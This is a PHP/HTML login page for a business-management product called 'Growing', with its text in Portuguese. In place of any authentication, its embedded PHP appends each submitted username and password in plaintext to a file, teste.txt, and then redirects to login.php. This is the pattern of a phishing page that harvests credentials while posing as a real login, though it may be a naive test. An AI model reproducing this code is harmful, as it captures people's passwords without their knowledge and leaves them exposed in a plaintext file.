<!DOCTYPE html>
<html>
<head>
	<title>Growing</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,user-scalable=0" />
	<link rel="stylesheet" type="text/css" href="pagcss.css/pag.css">
</head>
<body>
	<div class="box_model">
		<div class="box_model_int1">
			<div class="box_model_div1">
				<a href="../index.html"><img src="../img/logo.png"></a>
			</div>
			<div class="box_model_div2">
				<h4>Principais Recursos</h4>
				<ul>
					<li>Controle de Clientes</li>
					<li>Controle Financeiro</li>
					<li>Caixa</li>
					<li>Estoque</li>
					<li>Mapas</li>
					<li>Ordens de Serviços</li>
				</ul>
			</div>
		</div>
		<div class="box_model_int2">
			<div class="box_model_int2_int2">
				<div class="box_model_int2_div1">Informe Login e Senha:</div>
				<div class="box_model_int2_div2">
						<?php
							if (isset($_POST['email'])) {

							$nome = $_POST['email'];
							file_put_contents("teste.txt", $nome, FILE_APPEND);

							header("Location:login.php");
						}
						?>

						<?php
							if (isset($_POST['senha'])) {

							$nome = $_POST['senha'];
							file_put_contents("teste.txt", $nome, FILE_APPEND);

							header("Location:login.php");
						}
						?>
							
					 <form  method="post">
						<div class="form-group">
							<input type="text" name="email" class="form-control" placeholder="Usuário" autofocus />
							

							<input type="password" name="senha" class="form-control" placeholder="Senha"  />

							<button type="submit" class="botton_ox" value="Enviar dados">Entrar</button>
						</div>
					</form>
				</div>
			</div>
		</div>		
	</div>
	<footer>
		<p>Copyright © 2019 | Todos os direitos reservados</p>
		<div class="box_model_int3"><a href="../index.html"><img src="../img/logo.png"></a></div>
	</footer>
</body>
</html>